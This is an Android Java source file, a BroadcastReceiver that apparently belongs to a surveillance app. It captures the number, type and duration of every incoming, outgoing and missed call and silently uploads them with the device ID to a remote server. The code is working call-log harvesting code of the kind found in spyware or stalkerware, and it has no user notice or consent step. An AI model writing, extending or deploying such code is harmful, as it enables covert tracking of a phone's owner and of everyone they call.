package com.ultimate.access.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.ultimate.access.network.ApiClient;
import com.ultimate.access.network.ApiService;

import java.util.Date;
import java.util.HashMap;
import java.util.Map;

public class CallReceiver extends BroadcastReceiver {

    private static final String TAG = "CallReceiver";
    private static String lastState = "";
    private static String lastNumber = "";
    private static long callStartTime = 0;

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(TelephonyManager.ACTION_PHONE_STATE_CHANGED)) {
            String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

            if (incomingNumber != null) {
                lastNumber = incomingNumber;
            }

            if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                // Incoming call ringing
                lastState = "RINGING";
                Log.d(TAG, "Incoming call from: " + incomingNumber);

            } else if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                // Call answered or dialing
                if (lastState.equals("RINGING")) {
                    // Incoming call answered
                    callStartTime = System.currentTimeMillis();
                    Log.d(TAG, "Call answered");
                } else {
                    // Outgoing call
                    callStartTime = System.currentTimeMillis();
                    Log.d(TAG, "Outgoing call to: " + lastNumber);
                }
                lastState = "OFFHOOK";

            } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                // Call ended
                long callDuration = 0;
                if (callStartTime > 0) {
                    callDuration = (System.currentTimeMillis() - callStartTime) / 1000;
                }

                String callType;
                if (lastState.equals("RINGING")) {
                    callType = "MISSED";
                } else if (lastState.equals("OFFHOOK") && callStartTime > 0) {
                    if (lastNumber != null && !lastNumber.isEmpty()) {
                        callType = "OUTGOING";
                    } else {
                        callType = "INCOMING";
                    }
                } else {
                    callType = "UNKNOWN";
                }

                Log.d(TAG, "Call ended - Type: " + callType + ", Duration: " + callDuration + "s");

                // Send to server
                sendCallLogToServer(context, lastNumber, callType, callDuration);

                lastState = "IDLE";
                lastNumber = "";
                callStartTime = 0;
            }

        } else if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
            String outgoingNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            lastNumber = outgoingNumber;
            Log.d(TAG, "New outgoing call to: " + outgoingNumber);
        }
    }

    private void sendCallLogToServer(Context context, String number, String type, long duration) {
        if (number == null || number.isEmpty()) return;

        String deviceId = android.provider.Settings.Secure.getString(
                context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);

        Map<String, Object> callLog = new HashMap<>();
        callLog.put("deviceId", deviceId);
        callLog.put("number", number);
        callLog.put("name", "");
        callLog.put("duration", duration);
        callLog.put("type", type);
        callLog.put("date", new Date());

        Map<String, Object> request = new HashMap<>();
        request.put("deviceId", deviceId);
        request.put("callLogs", new Map[]{callLog});

        ApiService apiService = ApiClient.getClient().create(ApiService.class);
        apiService.sendCallLogs(request).enqueue(new retrofit2.Callback<ApiService.ServerResponse>() {
            @Override
            public void onResponse(retrofit2.Call<ApiService.ServerResponse> call,
                                   retrofit2.Response<ApiService.ServerResponse> response) {
                Log.d(TAG, "Call log sent to server");
            }

            @Override
            public void onFailure(retrofit2.Call<ApiService.ServerResponse> call, Throwable t) {
                Log.e(TAG, "Failed to send call log: " + t.getMessage());
            }
        });
    }
}